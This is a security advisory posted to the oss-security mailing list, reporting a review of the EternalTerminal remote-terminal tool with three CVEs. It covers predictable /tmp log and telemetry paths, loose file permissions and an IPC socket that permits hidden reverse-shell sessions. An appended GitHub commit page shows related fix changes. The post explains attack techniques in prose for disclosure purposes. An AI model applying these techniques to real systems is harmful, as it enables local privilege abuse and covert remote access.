=== Content from www.openwall.com_e83b7678_20250114_211327.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2023/02/15/6) [[next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <Y+5EDY4sEFoKuJ+Z@kasco.suse.de>
Date: Thu, 16 Feb 2023 15:56:12 +0100
From: Matthias Gerstner <mgerstner@...e.de>
To: oss-security@...ts.openwall.com
Subject: EternalTerminal: Review report and findings (predictable /tmp file
 paths and file permission issues, 3 CVEs)

Hello list,

this is a report about a review of the EternalTerminal [1] codebase I
performed and three CVE assignments that happened in this context.
EternalTerminal is an SSH-like remote terminal solution that survives
connection loss and IP roaming. Following is my detailed report which is based
on the v6.2.1 upstream release.

I publish this report today, because the maximum embargo period of 90 days we
offered upstream has been exceeded. Not all issues mentioned in this report
are currently fixed upstream.

[1]: <https://github.com/MisterTea/EternalTerminal>

1) Review Motivation
====================

There have been a number of CVE assignments for EternalTerminal in August
2022:

CVE-2022-24952: DoS triggered remotely by invalid sequence numbers.
CVE-2022-24951: race condition allows local attacker to hijack IPC socket.
CVE-2022-24950: race condition allows authenticated attacker to hijack other
                user's SSH authorization socket.

In light of these issues I have been asked to have a closer look if there
might linger more issues in the project.

2) Basic Design Overview
========================

EternalTerminal initially uses a regular SSH connection to establish a 256 bit
shared secret between client and server. The client invokes the executable
`etterminal` on the remote node via SSH. This creates a random `clientid` /
`passkey` pair which is passed (still on the remote node) to the privileged
`etserver` component via a UNIX domain socket. At this point the `etserver`
component has an entry for the `clientid` and its copy of the shared key for
that client. The `clientid` / `passkey` pair is also written to stdout and
consumed via the SSH connection by the `et` client process. This way the
client gets its copy of the shared key. The `etterminal` helper program on the
server side then backgrounds and keeps running. It implements the PTY that
will later be used for running the EternalTerminal session.

In a second step the client talks to the `etserver` remote instance via IP
port 2022. A Google Protocol Buffer based protocol is used here. An initial
cleartext message is sent that just states the `clientid` and the protocol
version of the client. If the server accepts the parameters then both parties
switch over to a libsodium secretbox encryption based on the 256 bit shared
secret `passkey` and an incrementally increasing nonce value. The server now
attaches the session to the PTY provided by the instance of `etterminal` that
was started earlier via regular SSH.

If the connection is lost then the client can connect to the remote node on
port 2022 again using the same `clientid` to resume a terminal session.

3) Issues
=========

3.a) World Readable Logfiles and Predictable Logfile Names in /tmp
------------------------------------------------------------------

Both etserver and etclient create logfiles directly in the "/tmp"
directory. For reference some example files:

    $ ls -lh /tmp/etserver*
    -rw-r--r-- 1 root root 393 Nov 18 13:44 /tmp/etserver-2022-11-18_13-44.log
    -rw-r----- 1 root root   0 Nov 18 13:44 /tmp/etserver_stderr_2022-11-18_01-44

    $ ls -lh /tmp/etclient*
    -rw-r--r-- 1 someuser users 1.8K Nov 18 13:45 /tmp/etclient-2022-11-18_13_44_52.log
    -rw-r----- 1 someuser users   78 Nov 18 13:44 /tmp/etclient_stderr_2022-11-18_01-44

This has the following problems:

- The stdout logfile is world-readable and the stderr logfile is still group
  readable. This can pose an information leak, depending on the logger
  configuration and what is exactly output during runtime by etserver and
  etclient. Other users on the system can deduce what is happening this way,
  including the `clientid`s used.

- The filenames of these logfiles are pretty predictable, with only minute
  timestamp granularity on the server and second timestamp granularity on the
  client side. This means a local attacker can prepare symlink attacks or
  precreate these files. Luckily on most current Linux systems this is prevented
  by the Linux kernel's symlink protection in world writable directories. Even
  with the protection it still poses a denial-of-service risk, because the
  EternalTerminal processes can fail to start if these files are precreated by
  other users. Without the kernel protection, file creation in privileged
  locations and logfile spoofing would be the impact.

### Upstream Fix

Upstream addressed some of the problems (open() flags, creation mode) in this
commit which is part of release 6.2.2:

<https://github.com/MisterTea/EternalTerminal/commit/92c4c6ada445c1925a8b397f4171ca7735cbda16>

### Further Suggestions

- Ideally the logfiles should go into a dedicated directory e.g. in
  /var/log/et for the server side.
- For the client side a set of logfiles can be kept in the home
  directory, but old logs should be deleted after some time.
  Alternatively client logs can be placed into `/run/user/<uid>/et-logs`
  or a similar location.

### CVE Assignments

Mitre assigned the following CVEs:

- CVE-2022-48257 for the "predictable log filename" aspect.
- CVE-2022-48258 for the "world readable log files" aspect.

3.b) TelemetryService Uses Fixed Paths in /tmp
----------------------------------------------

The TelemetryService class is instantiated using a database path in
"/tmp/.sentry-native-et" for the client and "/tmp/.sentry-native-etserver" for
the server. This is a directory within which further files and directories
will be queried and created during runtime.

Similar to issue 3.a) this allows other users on the system to pre-create this
parent directory which will be used by the `etclient` or `etserver` process.

For example in etserver the following system call sequence with regard
to this database directory can be observed during startup:

```
    mkdir("/tmp//.sentry-native-etserver", 0700) = -1 EEXIST (File exists)
    readlink("/tmp/.sentry-native-etserver", 0x7ffda847e750, 1023) = -1 EINVAL (Invalid argument)
    openat(AT_FDCWD, "/tmp/.sentry-native-etserver/a5323119-72df-430c-ad87-38054a86d7e1.run.lock", O_RDONLY|O_CREAT|O_TRUNC, 0666) = 5
    newfstatat(AT_FDCWD, "/tmp/.sentry-native-etserver/a5323119-72df-430c-ad87-38054a86d7e1.run.lock", {st_mode=S_IFREG|0644, st_size=0, ...}, 0) = 0
    mkdir("/tmp/.sentry-native-etserver", 0700) = -1 EEXIST (File exists)
    mkdir("/tmp/.sentry-native-etserver/a5323119-72df-430c-ad87-38054a86d7e1.run", 0700) = 0
    openat(AT_FDCWD, "/tmp/.sentry-native-etserver/user-consent", O_RDONLY) = -1 ENOENT (No such file or directory)
    newfstatat(AT_FDCWD, "/tmp/.sentry-native-etserver/last_crash", 0x7ffda847fdb0, 0) = -1 ENOENT (No such file or directory)
    openat(AT_FDCWD, "/tmp/.sentry-native-etserver", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 6
    newfstatat(AT_FDCWD, "/tmp/.sentry-native-etserver/a5323119-72df-430c-ad87-38054a86d7e1.run", {st_mode=S_IFDIR|0700, st_size=40, ...}, 0) = 0
    openat(AT_FDCWD, "/tmp/.sentry-native-etserver/a5323119-72df-430c-ad87-38054a86d7e1.run.lock", O_RDONLY|O_CREAT|O_TRUNC, 0666) = 7
    newfstatat(AT_FDCWD, "/tmp/.sentry-native-etserver/a5323119-72df-430c-ad87-38054a86d7e1.run.lock", {st_mode=S_IFREG|0644, st_size=0, ...}, 0) = 0
    newfstatat(AT_FDCWD, "/tmp/.sentry-native-etserver/a5323119-72df-430c-ad87-38054a86d7e1.run/session.json", 0x7ffda847faa0, 0) = -1 ENOENT (No such file or directory)
    unlink("/tmp/.sentry-native-etserver/a5323119-72df-430c-ad87-38054a86d7e1.run/session.json") = -1 ENOENT (No such file or directory)
    openat(AT_FDCWD, "/tmp/.sentry-native-etserver/a5323119-72df-430c-ad87-38054a86d7e1.run/session.json", O_RDWR|O_CREAT|O_TRUNC, 0664) = 6
    openat(AT_FDCWD, "/tmp/.sentry-native-etserver/a5323119-72df-430c-ad87-38054a86d7e1.run/session.json", O_RDWR|O_CREAT|O_TRUNC, 0664) = 6
```

A local attacker can create "/tmp/.sentry-native-etserver" with mode 0777
before `etserver` starts. The attacker will then control the complete
directory tree. Even though the TelemetryService backend uses UUIDs, they can
be deduced by waiting for the `.run.lock` file being created, from this time
on the local attacker knows the UUID and can try to win a race condition by
pre-creating also the `<UUID>.run` directory. The information placed there
will then leak to the attacker, but the attacker can also compromise the data
integrity by changing it.

Again, without the Linux kernel's symlink protection mechanism this
issue would provide a lot of possibilities to exploit symlink attacks. And in
the more deeply nested file paths below "/tmp/.sentry-native-etserver" the
symlink protection might not even be triggered.

### Upstream Fix

I do not know of any upstream efforts to fix this.

### Suggested Fix

- The client should create this directory in "/run/user/<UID>/sentry-native-et"
  instead.
- The server should create this directory in e.g. "/run/etserver/sentry-native-etserver"
  instead.

### CVE Assignments

Mitre assigned the following CVE:

- CVE-2023-23558 for the fixed "/tmp" path usage of the TelemetryService component

3.c) Registration of Server Sessions via Local IPC Socket Allows for Simple Reverse Shells
------------------------------------------------------------------------------------------

The socket on the `etserver` side at "/var/run/etserver.idpasskey.fifo" is
world accessible and allows any local user to register a future session with
EternalTerminal that can later be accessed remotely on port 2022. To do so
the local user only needs to get out the clientid and idpasskey registered at
the socket, which can also have static values, because the clientid and
passkey are selected by the client side, not by the privileged server side.

Usually only certain user accounts are allowed to log into a machine, based on
policies found e.g. in the SSH configuration, PAM stack configuration and so
on. Especially users without a valid account (no valid shell set, no password
assigned, locked, etc.) should not be able to log into a machine neither
locally nor remotely. These login policies can easily be circumvented by using
the `etserver` features.

A reverse shell can of course also be created in other ways as soon as a
local user account can execute arbitrary code. What makes it special
with `etserver` is that it will be very well hidden since it is using a
regular facility of the system. What makes this more problematic is that
there is no time limit, a local user account can register such a session
and access it days or event months later remotely, provided that the
`etserver` instance isn't restarted.

Since all that is needed to register a session is access to the local IPC
socket, this even has the potential to allow isolated container processes to
escape network isolation. Even if the process has a detached networking stack
(separate Linux network namespace), the mere access to `etserver`'s IPC socket
allows to create a remote connection to the container from the outside.
Depending on container configurations or other vulnerabilities in container
setups this can be a realistic threat.

### CVE Assignments

Since this is not a tangible vulnerability on its own I did not request a
dedicated CVE for it. I still believe that the topic should be addressed in
some form.

### Upstream Fix

I do not know of any upstream efforts to improve this aspect of
EternalTerminal.

## Suggested Fixes

- Ideally there would be a tighter coupling between the SSH authentication
  part and the connection to port 2022. For example a small PAM module could
  write out a kind of auth cookie during SSH login for the user account context
  that will be verified again once the connection on port 2022 is coming in.
  This should also be time limited so that the session doesn't remain valid
  forever but only for a few minutes or so, if no one actually connects to
  port 2022.

4) Other Suggestions
====================

4.a) srand(1) Calls
-------------------

Currently the following source locations (corresponding to the three main
programs) contain a call to `srand(1)`:

    terminal/TerminalServerMain.cpp:    srand(1);
    terminal/TerminalClientMain.cpp:    srand(1);
    terminal/TerminalMain.cpp:    srand(1);

Luckily the C `rand()` function is only used for non-sensitive things in the
codebase as far as I could see. Still this is bad practice, especially in a
program that is also doing cryptography. Things could get mixed up in the
future. I suggest to create a common init function that properly seeds the
random number generator using real random data e.g. obtained from libsodium.

### Upstream Fix

I do not know of any upstream efforts to improve on this.

4.b) Telemetry Enabled by Default
---------------------------------

I found it a bit irritating that the telemetry service is sending out
crash data by default without explicit user opt-in. Even though it is
anonymised I don't think an OSS program should send out data to third party
remote servers without explicit consent.

There should be at least a compile time option to influence this default
so that integrators of the package can decide which way to go here.

### Upstream Fix

Upstream made the Telemetry opt-in (changed the defaults) via this commit
which is part of release 6.2.2:

<https://github.com/MisterTea/EternalTerminal/commit/7289e04475a8418d376cbc7ecbcc580e23c42bb7>

4.c) Busy-wait Loop in TerminalServer::run()
--------------------------------------------

Currently the while loop there `select()`s with a timeout of 10.000
usec. I can see no purpose for that in the code, but it creates notable
CPU load even in idle in etserver and also makes analyzing the program
harder due to the massive load of system calls resulting from the busy loop.

### Upstream Fix

I do not know of any upstream efforts to improve on this.

4.d) TerminalUserInfo in etserver Receives User Controlled uid/gid Values
-------------------------------------------------------------------------

Currently the `etterminal` program sends the client's uid and gid values to
the privileged `etserver` via a local UNIX domain socket. This information
ends up in the TerminalUserInfo protobuf structure. Currently `etserver` uses
this information only for the jump host configuration in a non-sensitive way
as far as I can see.

For prudence I suggest to change this logic though. The uid and gid values can
be forged by the client and future code changes might miss this fact and
consider this information to be trusted. The safe way to obtain this
information would be to use the `SO_PEERCRED` socket option on the UNIX domain
socket connection on the privileged end. This way the information is obtained
from the kernel and can be trusted.

If it is intentional that clients can set this data then naming the fields
differently and documenting that this is untrusted data is recommended.

### Upstream Fix

I do not know of any upstream efforts to improve on this.

Timeline
========

2022-11-18: I shared an initial report with the upstream author(s) offering
            coordinated disclosure according to the openSUSE disclosure
            policy. Some discussions about fixing parts of the issues started
            but died down again.
            No statement about the desired duration of an embargo period (or
            any at all) was made by upstream. No confirmation of the
            individual issues or wishes regarding CVE assigments have been
            stated.
2023-01-09: I learned from upstream that information about issue 3.a) was
            already public in form of an upstream GitHub pull request. I asked
            about plans for fixes for the remaining findings and about
            upstream's desires for a prolonged embargo period and CVE
            assignments but got no answers.
2023-01-13: I requested the three CVEs mentioned in this report from Mitre for
            the issues that I deemed critical and concrete enough to assign
            CVEs.
2023-01-18: Upstream released version 6.2.2 containing fixes for issue 3.a),
            i.e. for CVE-2022-48257 and CVE-2022-48258.
2023-02-16: The maximum embargo period we offer (90 days) has been exceeded
            and lacking further details from upstream I published all
            information I have.

Best Regards

Matthias

--
Matthias Gerstner <matthias.gerstner@...e.de>
Security Engineer
<https://www.suse.com/security>
GPG Key ID: 0x14C405C971923553

SUSE Software Solutions Germany GmbH
HRB 36809, AG Nürnberg
Geschäftsführer: Ivo Totev, Andrew Myers, Andrew McDonald, Boudien Moerman

Download attachment "[signature.asc](1/1)" of type "application/pgp-signature" (834 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from github.com_f8207363_20250114_211331.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMisterTea%2FEternalTerminal%2Fcommit%2F900348bb8bc96e1c7ba4888ac8480f643c43d3c3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMisterTea%2FEternalTerminal%2Fcommit%2F900348bb8bc96e1c7ba4888ac8480f643c43d3c3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=MisterTea%2FEternalTerminal)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[MisterTea](/MisterTea)
/
**[EternalTerminal](/MisterTea/EternalTerminal)**
Public

* [Notifications](/login?return_to=%2FMisterTea%2FEternalTerminal) You must be signed in to change notification settings
* [Fork
  174](/login?return_to=%2FMisterTea%2FEternalTerminal)
* [Star
   3.1k](/login?return_to=%2FMisterTea%2FEternalTerminal)

* [Code](/MisterTea/EternalTerminal)
* [Issues
  83](/MisterTea/EternalTerminal/issues)
* [Pull requests
  0](/MisterTea/EternalTerminal/pulls)
* [Actions](/MisterTea/EternalTerminal/actions)
* [Projects
  0](/MisterTea/EternalTerminal/projects)
* [Security](/MisterTea/EternalTerminal/security)
* [Insights](/MisterTea/EternalTerminal/pulse)

Additional navigation options

* [Code](/MisterTea/EternalTerminal)
* [Issues](/MisterTea/EternalTerminal/issues)
* [Pull requests](/MisterTea/EternalTerminal/pulls)
* [Actions](/MisterTea/EternalTerminal/actions)
* [Projects](/MisterTea/EternalTerminal/projects)
* [Security](/MisterTea/EternalTerminal/security)
* [Insights](/MisterTea/EternalTerminal/pulse)

## Commit

[Permalink](/MisterTea/EternalTerminal/commit/900348bb8bc96e1c7ba4888ac8480f643c43d3c3)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

red fixes ([#468](https://github.com/MisterTea/EternalTerminal/pull/468))

[Browse files](/MisterTea/EternalTerminal/tree/900348bb8bc96e1c7ba4888ac8480f643c43d3c3)
Browse the repository at this point in the history

```
* red fixes

* remove magic number
```

* Loading branch information

[![@MisterTea](https://avatars.githubusercontent.com/u/306879?s=40&v=4)](/MisterTea)

[MisterTea](/MisterTea/EternalTerminal/commits?author=MisterTea "View all commits by MisterTea")
authored
Nov 3, 2021

1 parent
[d22f361](/MisterTea/EternalTerminal/commit/d22f36158b825ae455adbefda0bc6c9267e6563a)

commit 900348b

 Show file tree

 Hide file tree

Showing
**9 changed files**
with
**17 additions**
and
**7 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* .gitmodules
  [.gitmodules](#diff-fe7afb5c9c916e521401d3fcfb4277d5071798c3baf83baf11d6071742823584)
* CMakeLists.txt
  [CMakeLists.txt](#diff-1e7de1ae2d059d21e1dd75d5812d5a34b0222cef273b7c3a2af62eb747f9d20a)
* external

  + external/easyloggingpp
    [easyloggingpp](#diff-0f5e324e82c234398f98a21e3e85d30fb8baa2759b13e85d89c4b948c5541156)
* src

  + base

    - src/base/LogHandler.cpp
      [LogHandler.cpp](#diff-57c21e8edeef445f9975e85c7aac47e63a0262a9a4ec643988b0bec03c47d616)
    - src/base/PipeSocketHandler.cpp
      [PipeSocketHandler.cpp](#diff-b02c3b9d327f3fe8c6b6fc21b8c10170af0e6b52221bb16131634c994fe26a97)
  + terminal

    - src/terminal/TerminalClient.cpp
      [TerminalClient.cpp](#diff-f29fb56f4078609d8909017425b804ee10d50d1672e5cfcd9b384f5eba0fa64e)
    - src/terminal/UserTerminalRouter.cpp
      [UserTerminalRouter.cpp](#diff-a51fc296db97ed5232f76d78389f0ba095e9e0b22c079d50cd4b7f4da6608a11)
    - src/terminal/UserTerminalRouter.hpp
      [UserTerminalRouter.hpp](#diff-e40bcecf9eec909d1bf5113c77b7f54281ce962830d8e4836f9c372fd0583ba7)
    - forwarding

      * src/terminal/forwarding/PortForwardHandler.cpp
        [PortForwardHandler.cpp](#diff-0901b379da7c56c47ab0f680c0a8e4a57e195e66af64675e7c56be74ec080e0b)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[.gitmodules](#diff-fe7afb5c9c916e521401d3fcfb4277d5071798c3baf83baf11d6071742823584 ".gitmodules")

Show comments

[View file](/MisterTea/EternalTerminal/blob/900348bb8bc96e1c7ba4888ac8480f643c43d3c3/.gitmodules)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -12,7 +12,7 @@ |
|  |  | url = https://github.com/progschj/ThreadPool.git |
|  |  | [submodule "external/easyloggingpp"] |
|  |  | path = external/easyloggingpp |
|  |  | url = https://github.com/zuhd-org/easyloggingpp.git |
|  |  | url = https://github.com/MisterTea/easyloggingpp.git |
|  |  | [submodule "external/sanitizers-cmake"] |
|  |  | path = external/sanitizers-cmake |
|  |  | url = https://github.com/arsenm/sanitizers-cmake.git |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[CMakeLists.txt](#diff-1e7de1ae2d059d21e1dd75d5812d5a34b0222cef273b7c3a2af62eb747f9d20a "CMakeLists.txt")

Show comments

[View file](/MisterTea/EternalTerminal/blob/900348bb8bc96e1c7ba4888ac8480f643c43d3c3/CMakeLists.txt)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -163,7 +163,7 @@ add\_definitions(-DET\_VERSION="${PROJECT\_VERSION}") |
|  |  | # For easylogging, disable default log file, enable crash log, ensure thread |
|  |  | # safe, and catch c++ exceptions |
|  |  | set(CMAKE\_CXX\_FLAGS |
|  |  | "${CMAKE\_CXX\_FLAGS} -DELPP\_NO\_DEFAULT\_LOG\_FILE -DELPP\_FEATURE\_CRASH\_LOG -DELPP\_THREAD\_SAFE -DSENTRY\_BUILD\_STATIC" |
|  |  | "${CMAKE\_CXX\_FLAGS} -DELPP\_NO\_DEFAULT\_LOG\_FILE -DELPP\_FEATURE\_CRASH\_LOG -DELPP\_THREAD\_SAFE -DELPP\_STRICT\_PERMISSIONS -DSENTRY\_BUILD\_STATIC" |
|  |  | ) |
|  |  | IF(WIN32) |
|  |  | SET(CMAKE\_CXX\_FLAGS "-DSODIUM\_STATIC") |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[external/easyloggingpp](#diff-0f5e324e82c234398f98a21e3e85d30fb8baa2759b13e85d89c4b948c5541156 "external/easyloggingpp")

Show comments

Submodule [easyloggingpp](https://github.com/MisterTea/easyloggingpp)
updated
[29 files](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e)

| +1  −0 |  | [.github/FUNDING.yml](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-07985fdcade0e64d11482724879a644f07879ba61b8fb6c6119e1b1902b72ae4) |
| --- | --- | --- |
| +7  −7 |  | [ACKNOWLEDGEMENTS.md](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-27437d8db320dc71e7e07967cf05551d6b6baa7665d7e474b68f05dd7a0ca425) |
| +7  −7 |  | [CHANGELOG.md](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-06572a96a58dc510037d5efa622f9bec8519bc1beab13c9f251e97e657a9d4ed) |
| +6  −0 |  | [CMakeLists.txt](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-1e7de1ae2d059d21e1dd75d5812d5a34b0222cef273b7c3a2af62eb747f9d20a) |
| +3  −3 |  | [LICENSE](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-c693279643b8cd5d248172d9c22cb7cf4ed163a3c98c8a3f69c2717edd3eacb7) |
| +90  −78 |  | [README.md](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5) |
| +3  −3 |  | [cmake/FindEASYLOGGINGPP.cmake](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-cc2dbfcf00cf117d2f5fbfa496ecee524b07c196b8923ec4b7ebc60bfe27b4ad) |
| +1  −1 |  | [doc/RELEASE-NOTES-v9.09](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-9829f148656948cc5dd5eb9ac1481a04b8935acf0adef7c90350afdc43c009f3) |
| +1  −1 |  | [doc/RELEASE-NOTES-v9.17](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-bb3ad3e9c59e0cb8fc0e50d233379d1949c3f619209abd8317fd774017090969) |
| +2  −2 |  | [doc/RELEASE-NOTES-v9.18](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-cf2327e9a5948c4cfe350399000e7b97d705cc258acd83c722de63f339355a62) |
| +1  −1 |  | [doc/RELEASE-NOTES-v9.21](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-f09dace3af05253dcb53a26a678b057209a099cffb39ba36ebce8a606a2884fb) |
| +1  −1 |  | [doc/RELEASE-NOTES-v9.25](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-f45c973defa5c81e72997a0d4cf364e934782e68eafab876d86522cd473fc086) |
| +1  −1 |  | [doc/RELEASE-NOTES-v9.60](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-ee8ba13a23016b566c0ef388b07aeb9e982ed5e187223ba9eb5e2b2b810df5eb) |
| +3  −3 |  | [doc/RELEASE-NOTES-v9.92](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-1c0b391d0fa4f79be9ab83384ab653fe2c1bf6c3235f5f6770af21c4e16ad6e2) |
| +3  −3 |  | [doc/RELEASE-NOTES-v9.93](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-b845fc453a97cd7815f5684d229eb8010fec668e688a68d9f7ef7734b6f62b87) |
| +3  −3 |  | [doc/RELEASE-NOTES-v9.94](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-7f14a2356f14a3fe9bb9c123cff656833d0aeb2a45837ad1926c63be8e89d2d0) |
